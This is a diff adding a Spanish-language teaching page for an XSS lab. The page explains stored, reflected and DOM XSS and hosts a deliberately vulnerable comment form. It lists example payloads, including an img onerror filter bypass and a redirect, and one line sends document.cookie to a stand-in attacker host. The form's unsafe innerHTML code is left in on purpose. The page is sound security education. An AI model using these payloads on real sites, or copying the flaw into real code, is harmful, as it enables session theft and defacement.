@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SecureLab - Cross-Site Scripting (XSS)</title>
+    <style>
+        /* Estilos CSS idénticos a sql_injection.html - Pégalos aquí */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Courier New', monospace; background: linear-gradient(135deg, #0c0c0c 0%, #1a1a2e 100%); color: #00ff00; min-height: 100vh; }
+        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
+        .header { text-align: center; margin-bottom: 20px; border: 2px solid #00ff00; padding: 20px; background: rgba(0, 255, 0, 0.1); }
+        .header h1 { font-size: 2.2em; margin-bottom: 10px; text-shadow: 0 0 10px #00ff00; }
+        .back-link { display: inline-block; margin-bottom: 20px; padding: 10px 20px; background-color: #00ff00; color: #000; text-decoration: none; border-radius: 5px; font-weight: bold; transition: background-color 0.3s, transform 0.3s; border: 1px solid #00ff00; }
+        .back-link:hover { background-color: #00cccc; transform: scale(1.05); }
+        .content-section { margin-bottom: 20px; }
+        .concept-section, .how-it-works-section, .examples-section { background: rgba(0, 30, 0, 0.2); border: 1px solid #00cc00; padding: 20px; margin-bottom: 20px; border-radius: 5px; }
+        .concept-section h2, .how-it-works-section h2, .examples-section h2 { color: #00ffff; border-bottom: 1px solid #00ffff; padding-bottom: 8px; margin-bottom: 15px; font-size: 1.5em; }
+        .concept-section p, .how-it-works-section p, .examples-section p, .examples-section ul li { color: #ccffcc; line-height: 1.7; margin-bottom: 10px; }
+        .examples-section ul { list-style-type: none; padding-left: 0; }
+        .examples-section ul li { background: rgba(0, 50, 0, 0.4); padding: 15px; margin-bottom: 10px; border-radius: 4px; border-left: 3px solid #00ff00; }
+        .examples-section strong { color: #ffff00; display: block; margin-bottom: 5px; font-size: 1.1em; }
+        .examples-section em { color: #00ff00; font-style: normal; }
+        .examples-section code { background-color: #000; color: #00ff00; padding: 2px 5px; border-radius: 3px; font-family: 'Courier New', monospace; display: inline-block; margin-top: 5px; margin-bottom: 5px; }
+        .lab-section { background: rgba(0, 50, 0, 0.3); border: 1px solid #00ff00; margin: 20px 0; padding: 20px; border-radius: 5px; }
+        .lab-section h3 { color: #00ffff; margin-bottom: 15px; border-bottom: 2px solid #00ffff; padding-bottom: 5px; font-size: 1.5em; }
+        input, textarea, select { background: #1a1a2e; border: 1px solid #00ff00; color: #00ff00; padding: 10px; margin: 5px 0; border-radius: 3px; font-family: 'Courier New', monospace; width: 100%; max-width: 400px; display: block; }
+        textarea { min-height: 80px; }
+        button { background: #00ff00; color: #000; border: none; padding: 10px 20px; margin-top: 10px; border-radius: 3px; cursor: pointer; font-weight: bold; transition: all 0.3s; }
+        button:hover { background: #00cccc; transform: scale(1.05); }
+        .vulnerability-info { background: rgba(255, 255, 0, 0.1); border-left: 4px solid #ffff00; padding: 10px; margin: 15px 0; color: #ffff00; }
+        .code-block { background: #000; border: 1px solid #333; padding: 15px; margin: 10px 0; border-radius: 5px; overflow-x: auto; font-family: 'Courier New', monospace; color: #00ff00; }
+        .results { background: rgba(0, 255, 255, 0.1); border: 1px solid #00ffff; padding: 15px; margin: 10px 0; border-radius: 5px; min-height: 50px; word-wrap: break-word; }
+        #comments-display .comment-item { border: 1px solid #008800; padding: 10px; margin-bottom: 10px; border-radius: 4px; background: rgba(0,20,0,0.3); }
+        #comments-display .comment-item.xss-detected { border-color: #ff0000; background: rgba(50,0,0,0.5); }
+        @keyframes hue-rotate { 0% { filter: hue-rotate(0deg); } 100% { filter: hue-rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>Laboratorio: Cross-Site Scripting (XSS)</h1>
+        </div>
+
+        <a href="index.html" class="back-link">🏠 Volver al Inicio</a>
+
+        <div class="content-section">
+            <div class="concept-section">
+                <h2>¿Qué es Cross-Site Scripting (XSS)?</h2>
+                <p>
+                    El Cross-Site Scripting (XSS) es una vulnerabilidad de seguridad web que permite a un atacante inyectar scripts maliciosos (comúnmente JavaScript) en páginas web vistas por otros usuarios. Estos scripts pueden robar cookies de sesión, secuestrar cuentas de usuario, realizar acciones en nombre del usuario, o redirigir al usuario a sitios maliciosos. Hay tres tipos principales: XSS Reflejado (el script se refleja desde una solicitud HTTP), XSS Almacenado (el script se almacena permanentemente en el servidor, como en un comentario de blog), y XSS Basado en DOM (la vulnerabilidad reside en el código del lado del cliente).
+                </p>
+            </div>
+
+            <div class="how-it-works-section">
+                <h2>¿Cómo funciona en este laboratorio?</h2>
+                <p>
+                    El formulario de comentarios en este laboratorio no sanea (filtra o escapa adecuadamente) la entrada del usuario antes de mostrarla en la página. Si un usuario ingresa un comentario que contiene etiquetas <code>&lt;script&gt;</code>, el navegador interpretará y ejecutará ese script cuando se muestren los comentarios. Esto simula una vulnerabilidad de XSS Almacenado (Stored XSS), ya que el comentario "malicioso" se guarda y se muestra a otros usuarios (en este caso, a ti mismo al recargar o ver la sección de comentarios).
+                </p>
+            </div>
+
+            <div class="examples-section">
+                <h2>Ejemplos Prácticos de XSS</h2>
+                <ul>
+                    <li>
+                        <strong>Ejemplo 1: Alerta Básica</strong>
+                        <p>Comentario: <code>&lt;script&gt;alert('XSS Detectado!')&lt;/script&gt;</code></p>
+                        <p><em>Pista:</em> Este es el ataque XSS más fundamental para confirmar la vulnerabilidad. Si ves una alerta, el XSS es posible.</p>
+                    </li>
+                    <li>
+                        <strong>Ejemplo 2: Robo de Cookies (Conceptual)</strong>
+                        <p>Comentario: <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
+                        <p><em>Pista:</em> Si el sitio usara cookies y no fueran HTTPOnly, esto mostraría las cookies del usuario. En un ataque real, el atacante enviaría <code>document.cookie</code> a su propio servidor (ej: <code>new Image().src='http://atacante.com/log?cookie='+document.cookie</code>).</p>
+                    </li>
+                    <li>
+                        <strong>Ejemplo 3: Redirección Maliciosa</strong>
+                        <p>Comentario: <code>&lt;script&gt;window.location='http://example.com/phishing-page'&lt;/script&gt;</code></p>
+                        <p><em>Pista:</em> Redirige al usuario a otro sitio, que podría ser una página de phishing o contener malware.</p>
+                    </li>
+                    <li>
+                        <strong>Ejemplo 4: XSS con Eventos de Imagen</strong>
+                        <p>Comentario: <code>&lt;img src=x onerror=alert('XSS con imagen')&gt;</code></p>
+                        <p><em>Pista:</em> Un <code>&lt;img&gt;</code> con una fuente inválida (<code>src=x</code>) disparará el evento <code>onerror</code>, ejecutando el JavaScript. Es una forma común de bypassear filtros simples que buscan la etiqueta <code>&lt;script&gt;</code>.</p>
+                    </li>
+                    <li>
+                        <strong>Ejemplo 5: Manipulación del DOM para Defacement</strong>
+                        <p>Comentario: <code>&lt;script&gt;document.body.innerHTML = '&lt;h1 style="color:red;text-align:center;"&gt;Página Hackeada por XSS&lt;/h1&gt;'&lt;/script&gt;</code></p>
+                        <p><em>Pista:</em> Cambia el contenido de la página actual para el usuario que ve el comentario, demostrando la capacidad de modificar la página.</p>
+                    </li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="lab-section" id="xss-lab">
+            <h3>🎯 Laboratorio Práctico: Cross-Site Scripting (XSS)</h3>
+            <div class="vulnerability-info">
+                <strong>Vulnerabilidad:</strong> La entrada del usuario no está filtrada antes de mostrarse, permitiendo ejecución de JavaScript.
+            </div>
+
+            <h4>Formulario de Comentarios Vulnerable</h4>
+            <label for="comment">Escribe tu comentario aquí:</label>
+            <textarea id="comment" placeholder="Intenta inyectar código HTML o JavaScript..." rows="4"></textarea><br>
+            <button onclick="submitComment()">Enviar Comentario</button>
+
+            <div class="results">
+                <h4>Comentarios Recientes:</h4>
+                <div id="comments-display">
+                    </div>
+            </div>
+             <div class="vulnerability-info">
+                <strong>Pista Principal:</strong> Prueba con: <code>&lt;script&gt;alert('XSS Funcionando!')&lt;/script&gt;</code>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Simulación de XSS Almacenado
+        // En una aplicación real, los comentarios se guardarían en una base de datos.
+        // Aquí, solo se muestran en la página actual.
+        function submitComment() {
+            const commentText = document.getElementById('comment').value;
+            const display = document.getElementById('comments-display');
+
+            const commentDiv = document.createElement('div');
+            commentDiv.classList.add('comment-item');
+            
+            // Simulación de vulnerabilidad XSS: se inserta el HTML directamente.
+            // ¡PELIGRO! Esto es lo que causa la vulnerabilidad.
+            commentDiv.innerHTML = '<strong>Usuario Anónimo:</strong> ' + commentText; 
+
+            // Detección simulada para la UI (no previene el XSS en sí mismo en este ejemplo)
+            if (commentText.toLowerCase().includes("<script") || commentText.toLowerCase().includes("onerror") || commentText.toLowerCase().includes("onload=")) {
+                commentDiv.classList.add('xss-detected');
+                const xssWarning = document.createElement('p');
+                xssWarning.innerHTML = '<strong style="color:red;">¡XSS Potencial Detectado en este comentario!</strong> (El script se ejecutará si es válido)';
+                commentDiv.appendChild(xssWarning);
+                
+                // Para fines educativos y evitar que la página se rompa demasiado con alertas constantes,
+                // podríamos optar por NO ejecutar el alert() aquí si la simulación de "almacenado" ya lo hace.
+                // Sin embargo, para demostrar el XSS reflejado/inmediato, un alert es común.
+                // alert('XSS Vulnerability Detected! (El script se ejecutará en el comentario)');
+            }
+            
+            // Añadir al principio de la lista de comentarios
+            display.insertBefore(commentDiv, display.firstChild);
+            document.getElementById('comment').value = ''; // Limpiar el textarea
+        }
+
+        // Easter egg - Konami code
+        let konamiCode = [];
+        const konamiSequence = [38, 38, 40, 40, 37, 39, 37, 39, 66, 65];
+        document.addEventListener('keydown', function(e) {
+            konamiCode.push(e.keyCode);
+            if (konamiCode.length > konamiSequence.length) {
+                konamiCode.shift();
+            }
+            if (konamiCode.toString() === konamiSequence.toString()) {
+                console.log('🎮 Easter Egg Found! You discovered the Konami Code!');
+                const eggMessage = document.createElement('div');
+                eggMessage.textContent = '🎮 Konami Code Activated! 🎮';
+                eggMessage.style.position = 'fixed';
+                eggMessage.style.top = '50%';
+                eggMessage.style.left = '50%';
+                eggMessage.style.transform = 'translate(-50%, -50%)';
+                eggMessage.style.padding = '20px';
+                eggMessage.style.background = '#00ff00';
+                eggMessage.style.color = '#000';
+                eggMessage.style.border = '2px solid #000';
+                eggMessage.style.borderRadius = '10px';
+                eggMessage.style.zIndex = '1000';
+                eggMessage.style.boxShadow = '0 0 20px #00ff00';
+                document.body.appendChild(eggMessage);
+                setTimeout(() => {
+                    eggMessage.remove();
+                }, 3000);
+                document.body.style.animation = 'hue-rotate 2s infinite linear';
+            }
+        });
+    </script>
+</body>
+</html>
